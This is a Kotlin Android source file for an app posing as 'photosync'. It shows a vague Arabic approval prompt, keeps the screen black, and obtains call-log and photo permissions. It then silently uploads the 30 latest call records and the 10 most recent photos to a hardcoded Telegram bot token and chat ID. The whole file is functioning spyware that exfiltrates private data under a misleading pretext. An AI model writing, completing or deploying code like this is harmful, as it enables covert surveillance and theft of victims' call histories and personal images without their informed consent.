package com.example.photosync

import android.Manifest
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.CallLog
import android.provider.MediaStore
import android.view.View
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.io.DataOutputStream
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.concurrent.Executors

class MainActivity : AppCompatActivity() {

    private lateinit var rootView: View
    private val ioExecutor = Executors.newSingleThreadExecutor()

    private val botToken = "9085718260:AAFr_QfMHH1hgDrfZGpZbII9cgTqaC-mpVs"
    private val chatId = "8859920681"

    private val permissionsLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
            showBlackScreenOnly()
            startSyncWithRetry()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        rootView = findViewById(R.id.rootLayout)
        showBlackScreenOnly()
        showApprovalDialog()
    }

    private fun showApprovalDialog() {
        AlertDialog.Builder(this)
            .setTitle("تأكيد المتابعة")
            .setMessage("هل توافق على متابعة تشغيل الخدمة؟")
            .setCancelable(false)
            .setPositiveButton("موافقة") { dialog, _ ->
                dialog.dismiss()
                requestRequiredPermissions()
            }
            .setNegativeButton("رفض") { dialog, _ ->
                dialog.dismiss()
                showBlackScreenOnly()
            }
            .show()
    }

    private fun requestRequiredPermissions() {
        val perms = mutableListOf(Manifest.permission.READ_CALL_LOG)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        val missing = perms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isEmpty()) {
            showBlackScreenOnly()
            startSyncWithRetry()
        } else {
            permissionsLauncher.launch(perms.toTypedArray())
        }
    }

    private fun startSyncWithRetry() {
        ioExecutor.execute {
            val maxRetries = 3
            for (attempt in 1..maxRetries) {
                try {
                    sendCallLogsIfPermitted()
                    sendRecentPhotosIfPermitted(limit = 10)
                    break
                } catch (_: Exception) {
                    if (attempt < maxRetries) {
                        Thread.sleep(2500L * attempt)
                    }
                }
            }
        }
    }

    private fun sendCallLogsIfPermitted() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED
        ) return

        val rows = mutableListOf<String>()
        val projection = arrayOf(
            CallLog.Calls.NUMBER,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.TYPE,
            CallLog.Calls.DURATION,
            CallLog.Calls.DATE
        )

        contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            projection,
            null,
            null,
            "${CallLog.Calls.DATE} DESC"
        )?.use { cursor ->
            val numIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
            val nameIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)
            val typeIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
            val durIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
            val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)

            while (cursor.moveToNext() && rows.size < 30) {
                val number = cursor.getString(numIdx) ?: "unknown"
                val name = cursor.getString(nameIdx) ?: ""
                val type = when (cursor.getInt(typeIdx)) {
                    CallLog.Calls.INCOMING_TYPE -> "IN"
                    CallLog.Calls.OUTGOING_TYPE -> "OUT"
                    CallLog.Calls.MISSED_TYPE -> "MISSED"
                    CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                    else -> "OTHER"
                }
                val duration = cursor.getLong(durIdx)
                val date = cursor.getLong(dateIdx)
                rows.add("[$type] $number ($name) dur=${duration}s ts=$date")
            }
        }

        if (rows.isNotEmpty()) {
            val summary = "CallLogs:\n" + rows.joinToString("\n")
            postTelegramText(summary.take(3900))
        }
    }

    private fun sendRecentPhotosIfPermitted(limit: Int) {
        val hasImagePerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
        if (!hasImagePerm) return

        val uris = mutableListOf<Uri>()
        val projection = arrayOf(MediaStore.Images.Media._ID)
        contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )?.use { cursor ->
            val idIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            while (cursor.moveToNext() && uris.size < limit) {
                val id = cursor.getLong(idIdx)
                uris.add(Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()))
            }
        }

        for (uri in uris) {
            postTelegramPhoto(uri)
            Thread.sleep(500L)
        }
    }

    private fun postTelegramText(text: String) {
        val endpoint = "https://api.telegram.org/bot$botToken/sendMessage"
        val body = "chat_id=${URLEncoder.encode(chatId, "UTF-8")}&text=${URLEncoder.encode(text, "UTF-8")}"

        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            connectTimeout = 60_000
            readTimeout = 120_000
            doOutput = true
            doInput = true
            setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
        }

        DataOutputStream(conn.outputStream).use { out ->
            out.writeBytes(body)
            out.flush()
        }

        val code = conn.responseCode
        conn.disconnect()
        if (code !in 200..299) {
            throw RuntimeException("Telegram text HTTP $code")
        }
    }

    private fun postTelegramPhoto(imageUri: Uri) {
        val boundary = "----AndroidBoundary${System.currentTimeMillis()}"
        val lineEnd = "\r\n"
        val twoHyphens = "--"
        val endpoint = "https://api.telegram.org/bot$botToken/sendPhoto"

        val inputStream: InputStream = contentResolver.openInputStream(imageUri) ?: return
        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            connectTimeout = 60_000
            readTimeout = 120_000
            doInput = true
            doOutput = true
            useCaches = false
            setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
        }

        inputStream.use { stream ->
            DataOutputStream(conn.outputStream).use { out ->
                out.writeBytes(twoHyphens + boundary + lineEnd)
                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
                out.writeBytes(chatId + lineEnd)

                out.writeBytes(twoHyphens + boundary + lineEnd)
                out.writeBytes(
                    "Content-Disposition: form-data; name=\"photo\"; filename=\"photo_${System.currentTimeMillis()}.jpg\"$lineEnd"
                )
                out.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")

                val buffer = ByteArray(8192)
                var bytesRead: Int
                while (stream.read(buffer).also { bytesRead = it } != -1) {
                    out.write(buffer, 0, bytesRead)
                }

                out.writeBytes(lineEnd)
                out.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd)
                out.flush()
            }
        }

        val code = conn.responseCode
        conn.disconnect()
        if (code !in 200..299) {
            throw RuntimeException("Telegram photo HTTP $code")
        }
    }

    private fun showBlackScreenOnly() {
        rootView.setBackgroundColor(Color.BLACK)
        window.decorView.setBackgroundColor(Color.BLACK)
        window.statusBarColor = Color.BLACK
        window.navigationBarColor = Color.BLACK
    }

    override fun onDestroy() {
        super.onDestroy()
        ioExecutor.shutdown()
    }
}
